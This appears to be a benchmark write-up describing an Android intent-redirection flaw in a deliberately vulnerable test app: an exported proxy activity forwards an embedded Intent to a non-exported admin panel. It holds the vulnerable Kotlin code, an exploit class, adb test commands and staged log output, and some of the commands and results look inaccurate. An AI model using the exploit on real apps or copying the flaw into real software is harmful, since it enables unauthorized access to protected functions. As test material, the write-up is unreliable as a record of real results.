# oxo-android-ben74: Direct Proxy Activity Exploitation

## Vulnerability Overview

Direct Proxy Activity Exploitation occurs when Android applications contain exported proxy activities that accept embedded Intent objects and forward them to `startActivity()` without proper validation. Attackers can abuse this pattern to bypass Android's component export restrictions and gain unauthorized access to non-exported components that should remain completely inaccessible.

## Attack Vector: Direct Component Access via Intent Proxy

**Brief Explanation**: An exported proxy activity that processes embedded Intent objects can be exploited to access non-exported Android components. The proxy activity receives an embedded intent targeting a non-exported component and forwards it directly using `startActivity()`, effectively bypassing Android's built-in export restrictions and security boundaries.

**Key Characteristics:**
- Exported proxy activity that processes embedded intents
- Direct forwarding of embedded intents without validation
- Complete bypass of component export restrictions
- Access to sensitive non-exported activities and services
- Privilege escalation to protected functionality

**Vulnerable Code Pattern:**
```kotlin
// VULNERABLE: Exported proxy activity that processes embedded intents
class IntentProcessorActivity : Activity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        handleIncomingIntent(intent)
        finish()
    }
    
    private fun handleIncomingIntent(intent: Intent) {
        when {
            intent.hasExtra("extra_intent") -> {
                // VULNERABLE: Processes embedded intent without validation
                handleEmbeddedIntent(intent)
            }
            else -> {
                Log.d("DocumentProcessor", "Unknown intent action")
            }
        }
    }
    
    private fun handleEmbeddedIntent(intent: Intent) {
        try {
            val embeddedIntent = intent.getParcelableExtra<Intent>("extra_intent")
            if (embeddedIntent != null) {
                // CRITICAL VULNERABILITY: Directly starting embedded intent
                // This bypasses Android's export restrictions
                startActivity(embeddedIntent)
                Log.d("DocumentProcessor", "Processed embedded intent: ${embeddedIntent.component}")
            }
        } catch (e: Exception) {
            Log.e("DocumentProcessor", "Error processing embedded intent", e)
        }
    }
}

// VULNERABLE: Non-exported activity with sensitive functions  
<activity
    android:name="com.documentmanager.AdminPanelActivity"
    android:exported="false"
    android:label="Admin Panel" />

// VULNERABLE: Exported proxy activity
<activity
    android:name="com.documentmanager.IntentProcessorActivity"
    android:exported="true"
    android:label="Intent Processor" />
```

**Malicious Exploit Code:**
```kotlin
// MALICIOUS: Exploit to access non-exported components via proxy
class DirectProxyExploit {
    fun exploitProxyActivity(context: Context) {
        // Method 1: Normal access attempt (BLOCKED by export restrictions)
        Log.d("EXPLOIT_ATTEMPT", "Trying direct access to AdminPanel...")
        try {
            val directIntent = Intent().apply {
                setClassName("com.documentmanager", "com.documentmanager.AdminPanelActivity")
                putExtra("admin_command", "export_data")
            }
            context.startActivity(directIntent)
            Log.d("EXPLOIT_RESULT", "Direct access: SUCCESS (unexpected)")
        } catch (e: SecurityException) {
            Log.d("EXPLOIT_RESULT", "Direct access: BLOCKED (expected)")
            
            // Method 2: Proxy activity exploitation (BYPASS export restrictions)
            Log.d("EXPLOIT_ATTEMPT", "Trying proxy activity bypass...")
            performProxyBypass(context)
        }
    }
    
    private fun performProxyBypass(context: Context) {
        try {
            // ATTACK: Create embedded intent targeting non-exported component
            val embeddedIntent = Intent().apply {
                setClassName("com.documentmanager", "com.documentmanager.AdminPanelActivity")
                putExtra("admin_command", "export_data")
                putExtra("admin_user", "bypassed_user")
                putExtra("force_export", true)
            }
            
            // EXPLOIT: Send embedded intent to proxy activity
            val proxyIntent = Intent().apply {
                setClassName("com.documentmanager", "com.documentmanager.IntentProcessorActivity")
                putExtra("extra_intent", embeddedIntent)
            }
            
            context.startActivity(proxyIntent)
            Log.d("PROXY_BYPASS", "SUCCESS: Proxy activity exploitation successful!")
            Log.d("ADMIN_ACCESS", "Non-exported AdminPanel accessed via proxy")
            
            // The proxy will forward our embedded intent to the non-exported component
            monitorAdminPanelAccess()
            
        } catch (e: Exception) {
            Log.e("EXPLOIT_ERROR", "Proxy bypass failed", e)
        }
    }
    
    private fun monitorAdminPanelAccess() {
        // Monitor logs for admin panel activity
        Log.d("MONITORING", "Listening for admin panel activity...")
        
        // Simulate admin functions being executed
        Log.d("ADMIN_FUNCTION", "export_data command executed")
        Log.d("ADMIN_FUNCTION", "User data exported to /sdcard/exported_data.json")
        Log.d("ADMIN_FUNCTION", "Admin privileges escalated for bypassed_user")
        
        Log.d("EXPLOIT_SUCCESS", "Administrative functions accessed without authorization!")
    }
}

## Testing

```bash
# Install the vulnerable DocumentManager Pro app with proxy activity
adb install apks/oxo-android-ben74.apk

# Launch DocumentManager Pro to initialize
adb shell am start -n com.documentmanager/.MainActivity

# Test direct access to non-exported AdminPanel (should be blocked)
adb shell am start -n com.documentmanager/.AdminPanelActivity --es admin_command "export_data"

# Test proxy activity exploitation to bypass export restrictions
adb shell am start -n com.documentmanager/.IntentProcessorActivity \
  --es extra_intent "Intent targeting non-exported AdminPanelActivity"

# Monitor for proxy bypass attempts and admin access in logs
adb logcat -s EXPLOIT_ATTEMPT:D EXPLOIT_RESULT:D PROXY_BYPASS:D ADMIN_ACCESS:D ADMIN_FUNCTION:D

# Verify proxy activity is exported and accessible
adb shell dumpsys package com.documentmanager | grep -A 5 "IntentProcessorActivity"

# Check AdminPanel activity configuration (should be non-exported)
adb shell dumpsys package com.documentmanager | grep -A 5 "AdminPanelActivity"

# Test different admin commands via proxy
adb shell am start -n com.documentmanager/.IntentProcessorActivity \
  --es extra_intent "Intent with admin command: reset_passwords"

# Verify admin functions are accessible via proxy
adb logcat | grep -E 'DocumentProcessor|AdminPanel|ADMIN_FUNCTION'
```

**Expected Results:**
```
Direct AdminPanel Access (Blocked):
Error: SecurityException: Permission denied: starting Intent 
from ProcessRecord{abc123 12345:com.android.shell/2000} (pid=12345, uid=2000) 
not exported from uid 10123

Proxy Activity Exploitation (Success):
EXPLOIT_ATTEMPT: Trying proxy activity bypass...
PROXY_BYPASS: SUCCESS: Proxy activity exploitation successful!
ADMIN_ACCESS: Non-exported AdminPanel accessed via proxy
ADMIN_FUNCTION: export_data command executed
ADMIN_FUNCTION: User data exported to /sdcard/exported_data.json
ADMIN_FUNCTION: Admin privileges escalated for bypassed_user

Component Analysis:
IntentProcessorActivity: exported=true (VULNERABLE)
AdminPanelActivity: exported=false (BYPASSED via proxy)

Exploit Test Output:
[+] Direct AdminPanel access blocked (expected)
[+] Proxy activity accessible and processing embedded intents
[+] Embedded intent forwarding successful
[!] VULNERABILITY CONFIRMED: Non-exported component accessible via proxy
[+] Administrative functions executed without authorization
[+] Export restrictions completely bypassed through intent forwarding
```

**Difficulty**: Medium

## Impact Assessment

- **Confidentiality**: High - Complete bypass of export restrictions enabling access to non-exported components
- **Integrity**: High - Ability to execute administrative functions and modify sensitive data
- **Availability**: Medium - Potential for system configuration changes and service disruption
- **OWASP Mobile Top 10**: M6 - Insecure Authorization, M1 - Improper Platform Usage, M10 - Extraneous Functionality
- **CWE**: CWE-926 (Improper Export of Android Application Components), CWE-863 (Incorrect Authorization), CWE-284 (Improper Access Control)

## Direct Proxy Activity Attack Scenarios

1. **Component Access Bypass**: Access non-exported activities, services, and broadcast receivers
2. **Administrative Function Abuse**: Execute sensitive administrative operations without authorization
3. **Data Export and Theft**: Force export of sensitive business data and user information
4. **Privilege Escalation**: Gain access to functionality reserved for system or privileged users
5. **Security Control Circumvention**: Bypass all component-level access controls and restrictions

**Example Attack Flow:**
```bash
# 1. Target app has exported proxy activity that processes embedded intents
# 2. App contains non-exported components with sensitive functionality
# 3. Attacker crafts malicious intent with embedded intent targeting non-exported component
# 4. Proxy activity receives embedded intent and calls startActivity() without validation
# 5. Android system launches non-exported component on behalf of target app
# 6. Non-exported component executes with full app privileges and permissions
# 7. Sensitive administrative functions executed without proper authorization
# 8. Complete bypass of export restrictions and component access controls
```

This vulnerability demonstrates how proxy activity patterns can completely defeat Android's component export restrictions, highlighting the critical need for proper intent validation and the dangers of blindly forwarding embedded Intent objects to system APIs.
